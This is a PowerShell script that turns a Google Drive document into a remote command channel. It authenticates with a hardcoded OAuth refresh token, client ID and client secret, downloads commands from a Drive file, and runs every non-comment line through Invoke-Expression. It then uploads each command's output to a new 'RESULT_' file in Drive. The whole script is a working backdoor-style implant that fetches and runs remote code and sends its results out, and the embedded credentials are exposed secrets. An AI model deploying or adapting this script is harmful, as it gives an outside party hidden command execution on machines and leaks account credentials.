###################################################################### 
#                                                                    # 
#  Script to execute commands from Google Drive                      # 
#                                                                    # 
###################################################################### 
# We define the variables to request the OAuth access token 
$refreshToken = "1/jKf7yXY6PwqjQBMnwtRs92x2mM0yu_azqHKAAGIubKei0jB3x2luRv5cO6fXiMKN" 
$ClientID = "168135810801-pl98d5jmkaoq1a92jot6tltjeop7a0ti.apps.googleusercontent.com" 
$ClientSecret = "S9Go2mkKkrN5-FkzGbgSzy1z" 
$grantType = "refresh_token" 
$requestUri = "https://accounts.google.com/o/oauth2/token" 
$GAuthBody = "refresh_token=$refreshToken&client_id=$ClientID&client_secret=$ClientSecret&grant_type=$grantType" 
$GAuthResponse = Invoke-RestMethod -Method Post -Uri $requestUri -ContentType "application/x-www-form-urlencoded" -Body $GAuthBody 
$accessToken = $GAuthResponse.access_token 
# We define the headers with the OAuth access token that we have from the previous step 
$headers = @{"Authorization" = "Bearer $accessToken" 
              "Content-type" = "application/json" 
              "Accept" = "application/json" 
              } 
# This is the ID of the document in Google Drive which contains the commands to be executed 
$DocumentID = "11JzeHrzw36g9bWbO5jG8ir9A4Te0MDjkd5ptJXoBuGg" 
# We download the file 
$File = Invoke-RestMethod -Uri "https://www.googleapis.com/drive/v3/files/$DocumentID" -Method GET -Headers $headers 
$FileContent = Invoke-RestMethod -Uri "https://www.googleapis.com/drive/v3/files/$DocumentID/export?mimeType=text/plain" -Method GET -Headers $headers 
$FileContent > temp.txt 
# We create a new file in Drive in order to respond with the result of the commands 
$NewFileName = "RESULT_" + $File.name 
$NewFile = Invoke-RestMethod -Uri "https://www.googleapis.com/upload/drive/v3/files" -Method POST -Headers $headers 
$NewFileID = $NewFile.id 
# With this request we are changing the name of the file in Drive (just to be pretty) 
$r = Invoke-WebRequest -Uri "https://www.googleapis.com/drive/v3/files/$NewFileID" -Method PATCH -Headers $headers -body "{`"name`":`"$NewFileName`", `"mimeType`":`"application/vnd.google-apps.document`"}" 
$PlainContent = Get-content .\temp.txt 
rm temp.txt 
$body = "" 
foreach ($line in $PlainContent) 
{ 
    if ($line.Contains("#")) { 
        #do nothing 
    } else { 
        echo "comando: $line" 
        $comandos += $line 
        $result = Invoke-Expression $line 
        $body += echo "$line ---- `n $result `n" 
        $r = Invoke-RestMethod -Uri "https://www.googleapis.com/upload/drive/v3/files/$NewFileID" -Method PATCH -Headers $headers -Body $body 
    } 
} 
